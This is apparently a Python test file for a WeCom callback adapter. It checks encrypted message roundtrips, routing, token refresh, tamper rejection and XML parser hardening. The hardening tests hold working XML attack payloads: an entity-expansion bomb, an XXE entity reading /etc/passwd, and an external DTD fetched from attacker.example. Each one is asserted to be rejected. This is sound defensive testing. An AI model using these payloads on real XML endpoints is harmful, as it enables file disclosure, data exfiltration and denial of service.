"""Tests for the WeCom callback-mode adapter."""

import asyncio
from xml.etree import ElementTree as ET

import pytest

from gateway.config import PlatformConfig
from plugins.platforms.wecom.callback_adapter import WecomCallbackAdapter
from plugins.platforms.wecom.wecom_crypto import WXBizMsgCrypt


def _app(name="test-app", corp_id="ww1234567890", agent_id="1000002"):
    return {
        "name": name,
        "corp_id": corp_id,
        "corp_secret": "test-secret",
        "agent_id": agent_id,
        "token": "test-callback-token",
        "encoding_aes_key": "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFG",
    }


def _config(apps=None):
    return PlatformConfig(
        enabled=True,
        extra={"mode": "callback", "host": "127.0.0.1", "port": 0, "apps": apps or [_app()]},
    )


class TestWecomCrypto:
    def test_roundtrip_encrypt_decrypt(self):
        app = _app()
        crypt = WXBizMsgCrypt(app["token"], app["encoding_aes_key"], app["corp_id"])
        encrypted_xml = crypt.encrypt(
            "<xml><Content>hello</Content></xml>", nonce="nonce123", timestamp="123456",
        )
        root = ET.fromstring(encrypted_xml)
        decrypted = crypt.decrypt(
            root.findtext("MsgSignature", default=""),
            root.findtext("TimeStamp", default=""),
            root.findtext("Nonce", default=""),
            root.findtext("Encrypt", default=""),
        )
        assert b"<Content>hello</Content>" in decrypted


class TestWecomCallbackEventConstruction:
    def test_build_event_extracts_text_message(self):
        adapter = WecomCallbackAdapter(_config())
        xml_text = """
        <xml>
          <ToUserName>ww1234567890</ToUserName>
          <FromUserName>zhangsan</FromUserName>
          <CreateTime>1710000000</CreateTime>
          <MsgType>text</MsgType>
          <Content>\u4f60\u597d</Content>
          <MsgId>123456789</MsgId>
        </xml>
        """
        event = adapter._build_event(_app(), xml_text)
        assert event is not None
        assert event.source is not None
        assert event.source.user_id == "zhangsan"
        assert event.source.chat_id == "ww1234567890:zhangsan"
        assert event.message_id == "123456789"
        assert event.text == "\u4f60\u597d"


class TestWecomCallbackRouting:

    @pytest.mark.asyncio
    async def test_send_selects_correct_app_for_scoped_chat_id(self):
        apps = [
            _app(name="corp-a", corp_id="corpA", agent_id="1001"),
            _app(name="corp-b", corp_id="corpB", agent_id="2002"),
        ]
        adapter = WecomCallbackAdapter(_config(apps=apps))
        adapter._user_app_map["corpB:alice"] = "corp-b"
        adapter._access_tokens["corp-b"] = {"token": "tok-b", "expires_at": 9999999999}

        calls = {}

        class FakeResponse:
            def json(self):
                return {"errcode": 0, "msgid": "ok1"}

        class FakeClient:
            async def post(self, url, json):
                calls["url"] = url
                calls["json"] = json
                return FakeResponse()

        adapter._http_client = FakeClient()
        result = await adapter.send("corpB:alice", "hello")

        assert result.success is True
        assert calls["json"]["touser"] == "alice"
        assert calls["json"]["agentid"] == 2002
        assert "tok-b" in calls["url"]


class TestWecomCallbackSendTokenRefresh:
    @pytest.mark.asyncio
    async def test_send_retries_with_fresh_token_on_errcode_40001(self):
        """errcode=40001 must evict the cached token, refresh, and retry once."""
        adapter = WecomCallbackAdapter(_config())
        adapter._access_tokens["test-app"] = {"token": "stale", "expires_at": 9999999999}
        adapter._user_app_map["ww1234567890:alice"] = "test-app"

        responses = [
            {"errcode": 40001, "errmsg": "invalid credential"},
            {"errcode": 0, "msgid": "msg-ok"},
        ]
        post_calls = []

        class FakeClient:
            async def post(self, url, json=None, **kw):
                post_calls.append(url)

                class R:
                    def json(inner):
                        return responses[len(post_calls) - 1]
                return R()

            async def get(self, url, params=None, **kw):
                class R:
                    def json(inner):
                        return {"errcode": 0, "access_token": "fresh", "expires_in": 7200}
                return R()

        adapter._http_client = FakeClient()
        result = await adapter.send("ww1234567890:alice", "hello")

        assert result.success is True
        assert result.message_id == "msg-ok"
        assert len(post_calls) == 2
        assert "fresh" in post_calls[1]
        assert adapter._access_tokens["test-app"]["token"] == "fresh"


class TestWecomCallbackPollLoop:
    @pytest.mark.asyncio
    async def test_poll_loop_dispatches_handle_message(self, monkeypatch):
        adapter = WecomCallbackAdapter(_config())
        calls = []

        async def fake_handle_message(event):
            calls.append(event.text)

        monkeypatch.setattr(adapter, "handle_message", fake_handle_message)
        event = adapter._build_event(
            _app(),
            """
            <xml>
              <ToUserName>ww1234567890</ToUserName>
              <FromUserName>lisi</FromUserName>
              <CreateTime>1710000000</CreateTime>
              <MsgType>text</MsgType>
              <Content>test</Content>
              <MsgId>m2</MsgId>
            </xml>
            """,
        )
        task = asyncio.create_task(adapter._poll_loop())
        await adapter._message_queue.put(event)
        await asyncio.sleep(0.05)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task
        assert calls == ["test"]


class TestWecomCallbackBodySizeLimit:
    """Pre-auth oversized-body rejection (DoS hardening, PR #10192)."""

    def _request(self, body_bytes):
        from unittest.mock import Mock

        from aiohttp import StreamReader
        from aiohttp.test_utils import make_mocked_request

        protocol = Mock(_reading_paused=False)
        reader = StreamReader(protocol=protocol, limit=2 ** 20)
        reader.feed_data(body_bytes)
        reader.feed_eof()
        return make_mocked_request(
            "POST", "/wecom/callback?msg_signature=s&timestamp=1&nonce=n",
            payload=reader,
        )

    @pytest.mark.asyncio
    async def test_oversized_body_rejected_with_413(self):
        from plugins.platforms.wecom.callback_adapter import _MAX_BODY

        adapter = WecomCallbackAdapter(_config())
        oversized = b"<xml>" + b"A" * (_MAX_BODY + 1) + b"</xml>"
        response = await adapter._handle_callback(self._request(oversized))
        assert response.status == 413


# --------------------------------------------------------------------------- #
# WAVE-29 §6: WeCom encrypted-reply regression + XML security hardening.
#
# The encrypted-reply path (WXBizMsgCrypt.encrypt) shipped broken: it built the
# outbound envelope with stdlib ElementTree constructors imported from the
# defusedxml module, which does not re-export them, so encrypt() raised
# AttributeError before any reply could be sent. These tests pin the fix
# (outbound construction with the stdlib builder) while proving the inbound
# untrusted-XML parser stays defused (XXE / entity-expansion fail closed) and
# that no key/plaintext leaks into errors.
# --------------------------------------------------------------------------- #
import base64 as _base64
import logging
import os as _os

import pytest as _pytest

from defusedxml.common import DefusedXmlException
from plugins.platforms.wecom.wecom_crypto import (
    DecryptError,
    SignatureError,
    WeComCryptoError,
)


def _fresh_aes_key() -> str:
    """A valid 43-char WeCom EncodingAESKey distinct from the fixture key."""
    return _base64.b64encode(_os.urandom(32)).decode("ascii").rstrip("=")


def _crypt(app=None):
    app = app or _app()
    return WXBizMsgCrypt(app["token"], app["encoding_aes_key"], app["corp_id"])


def _envelope_fields(encrypted_xml):
    root = ET.fromstring(encrypted_xml)
    return {
        "Encrypt": root.findtext("Encrypt", default=""),
        "MsgSignature": root.findtext("MsgSignature", default=""),
        "TimeStamp": root.findtext("TimeStamp", default=""),
        "Nonce": root.findtext("Nonce", default=""),
    }


class TestWecomEncryptedReplyRoundtrip:
    """Outbound construction works; every reply round-trips back to plaintext."""

    def test_encrypt_produces_wellformed_envelope_with_all_fields(self):
        crypt = _crypt()
        out = crypt.encrypt("<xml><Content>ok</Content></xml>",
                            nonce="n1", timestamp="1710000000")
        fields = _envelope_fields(out)
        assert fields["Encrypt"]  # non-empty ciphertext
        assert fields["Nonce"] == "n1"
        assert fields["TimeStamp"] == "1710000000"
        # signature is deterministic over token+timestamp+nonce+encrypt
        assert len(fields["MsgSignature"]) == 40  # sha1 hexdigest

    def test_reply_roundtrips_to_original_plaintext(self):
        crypt = _crypt()
        payload = "<xml><Content>hello reply</Content></xml>"
        out = crypt.encrypt(payload, nonce="nonce9", timestamp="123")
        f = _envelope_fields(out)
        back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
        assert back.decode("utf-8") == payload

    def test_unicode_content_roundtrips(self):
        crypt = _crypt()
        payload = "<xml><Content>你好\U0001f600 café</Content></xml>"
        f = _envelope_fields(crypt.encrypt(payload, nonce="n", timestamp="1"))
        back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
        assert back.decode("utf-8") == payload

    def test_xml_special_chars_are_escaped_and_survive_roundtrip(self):
        crypt = _crypt()
        # Ampersands / angle brackets inside a reply must be escaped by the
        # builder (never string-concatenated) and decode back byte-identical.
        payload = "<xml><Content>a &amp; b &lt;tag&gt; \"q\" 'q'</Content></xml>"
        out = crypt.encrypt(payload, nonce="n", timestamp="1")
        # The envelope itself must be parseable (proves proper escaping).
        f = _envelope_fields(out)
        back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
        assert back.decode("utf-8") == payload

    def test_builder_escapes_metacharacters_in_fields(self):
        # The Encrypt field is base64 (no metacharacters), so to prove the
        # builder ESCAPES field text rather than string-concatenating it, feed an
        # angle bracket through a field we control (Nonce) and require the whole
        # envelope to still parse and the value to come back intact. A
        # concatenating builder would emit invalid XML here.
        crypt = _crypt()
        out = crypt.encrypt("<xml><Content><![CDATA[x]]></Content></xml>",
                            nonce="a<b", timestamp="1")
        assert _envelope_fields(out)["Nonce"] == "a<b"

    def test_empty_content_roundtrips(self):
        crypt = _crypt()
        f = _envelope_fields(crypt.encrypt("", nonce="n", timestamp="1"))
        back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
        assert back == b""

    def test_large_payload_roundtrips(self):
        crypt = _crypt()
        payload = "<xml><Content>" + ("A" * 200_000) + "</Content></xml>"
        f = _envelope_fields(crypt.encrypt(payload, nonce="n", timestamp="1"))
        back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
        assert back.decode("utf-8") == payload

    def test_block_boundary_lengths_roundtrip(self):
        # PKCS7 block size is 32; exercise lengths around the boundary.
        crypt = _crypt()
        for n in (0, 1, 31, 32, 33, 63, 64, 65):
            payload = "B" * n
            f = _envelope_fields(crypt.encrypt(payload, nonce="n", timestamp="1"))
            back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
            assert back.decode("utf-8") == payload, f"len={n}"


class TestWecomCryptoFailurePaths:
    """Every tamper / mismatch path fails closed with a typed error."""

    def test_invalid_signature_rejected(self):
        crypt = _crypt()
        f = _envelope_fields(crypt.encrypt("<xml/>", nonce="n", timestamp="1"))
        with _pytest.raises(SignatureError):
            crypt.decrypt("deadbeef" * 5, f["TimeStamp"], f["Nonce"], f["Encrypt"])

    def test_tampered_ciphertext_rejected_even_with_valid_signature(self):
        crypt = _crypt()
        f = _envelope_fields(crypt.encrypt("<xml><Content>x</Content></xml>",
                                           nonce="n", timestamp="1"))
        raw = _base64.b64decode(f["Encrypt"])
        tampered = bytearray(raw)
        tampered[20] ^= 0x01
        tampered_b64 = _base64.b64encode(bytes(tampered)).decode("ascii")
        # Recompute a VALID signature over the tampered ciphertext so the
        # signature check passes and the crypto/padding layer must catch it.
        from plugins.platforms.wecom.wecom_crypto import _sha1_signature
        sig = _sha1_signature(crypt.token, f["TimeStamp"], f["Nonce"], tampered_b64)
        with _pytest.raises(WeComCryptoError):
            crypt.decrypt(sig, f["TimeStamp"], f["Nonce"], tampered_b64)

    def test_malformed_base64_ciphertext_rejected(self):
        crypt = _crypt()
        from plugins.platforms.wecom.wecom_crypto import _sha1_signature
        bad = "!!!not-base64!!!"
        sig = _sha1_signature(crypt.token, "1", "n", bad)
        with _pytest.raises(DecryptError):
            crypt.decrypt(sig, "1", "n", bad)

    def test_wrong_receive_id_rejected(self):
        sender = _crypt(_app(corp_id="corpAAA"))
        f = _envelope_fields(sender.encrypt("<xml/>", nonce="n", timestamp="1"))
        # Same token/key so signature + AES succeed, but receive_id differs.
        app2 = _app(corp_id="corpBBB")
        receiver = WXBizMsgCrypt(app2["token"], _app()["encoding_aes_key"], "corpBBB")
        with _pytest.raises(DecryptError):
            receiver.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])

    def test_wrong_aes_key_rejected(self):
        app = _app()
        sender = WXBizMsgCrypt(app["token"], app["encoding_aes_key"], app["corp_id"])
        f = _envelope_fields(sender.encrypt("<xml><Content>x</Content></xml>",
                                            nonce="n", timestamp="1"))
        # Different key, same token -> signature passes, AES/padding must fail.
        receiver = WXBizMsgCrypt(app["token"], _fresh_aes_key(), app["corp_id"])
        with _pytest.raises(WeComCryptoError):
            receiver.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])

    def test_invalid_encoding_aes_key_length_rejected_at_construction(self):
        with _pytest.raises(ValueError):
            WXBizMsgCrypt("tok", "tooshort", "rid")


class TestWecomInboundXmlHardening:
    """Untrusted inbound XML stays defused: XXE / entity expansion fail closed."""

    def test_billion_laughs_rejected(self):
        adapter = WecomCallbackAdapter(_config())
        bomb = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE lolz [<!ENTITY lol "lol">'
            '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">'
            '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">]>'
            "<xml><MsgType>text</MsgType><Content>&lol3;</Content></xml>"
        )
        with _pytest.raises(DefusedXmlException):
            adapter._build_event(_app(), bomb)

    def test_external_entity_xxe_rejected(self):
        adapter = WecomCallbackAdapter(_config())
        xxe = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<xml><MsgType>text</MsgType><Content>&xxe;</Content></xml>"
        )
        with _pytest.raises(DefusedXmlException):
            adapter._build_event(_app(), xxe)

    def test_external_parameter_entity_rejected(self):
        # The classic external-DTD XXE vector: an external *parameter* entity
        # declared and referenced in the internal subset. defusedxml forbids the
        # entity declaration outright, so no external fetch can occur.
        adapter = WecomCallbackAdapter(_config())
        payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY % ext SYSTEM '
            '"http://attacker.example/evil.dtd"> %ext;]>'
            "<xml><MsgType>text</MsgType><Content>x</Content></xml>"
        )
        with _pytest.raises(DefusedXmlException):
            adapter._build_event(_app(), payload)

    def test_malformed_xml_rejected(self):
        # Malformed XML must raise a parse error, not be swallowed into a None
        # return. defusedxml surfaces the stdlib ParseError.
        adapter = WecomCallbackAdapter(_config())
        with _pytest.raises(ET.ParseError):
            adapter._build_event(_app(), "<xml><Content>no close")

    def test_wellformed_inbound_still_parses(self):
        adapter = WecomCallbackAdapter(_config())
        ev = adapter._build_event(
            _app(),
            "<xml><ToUserName>ww1234567890</ToUserName>"
            "<FromUserName>bob</FromUserName><MsgType>text</MsgType>"
            "<Content>hi</Content><MsgId>9</MsgId></xml>",
        )
        assert ev is not None and ev.text == "hi"


class TestWecomNoSecretLeakage:
    """Keys and plaintext never reach exception messages or logs."""

    def test_decrypt_error_does_not_leak_key_or_ciphertext(self):
        app = _app()
        crypt = WXBizMsgCrypt(app["token"], app["encoding_aes_key"], app["corp_id"])
        from plugins.platforms.wecom.wecom_crypto import _sha1_signature
        bad = _base64.b64encode(b"\x00" * 48).decode("ascii")
        sig = _sha1_signature(crypt.token, "1", "n", bad)
        with _pytest.raises(WeComCryptoError) as exc:
            crypt.decrypt(sig, "1", "n", bad)
        msg = str(exc.value)
        assert app["encoding_aes_key"] not in msg
        assert crypt.key.hex() not in msg
        assert crypt.key not in msg.encode("utf-8", "ignore")

    def test_encrypt_does_not_log_plaintext(self, caplog):
        crypt = _crypt()
        secret_marker = "TOP-SECRET-REPLY-BODY-4242"
        with caplog.at_level(logging.DEBUG):
            crypt.encrypt(f"<xml><Content>{secret_marker}</Content></xml>",
                          nonce="n", timestamp="1")
        for rec in caplog.records:
            assert secret_marker not in rec.getMessage()
            assert crypt.key.hex() not in rec.getMessage()

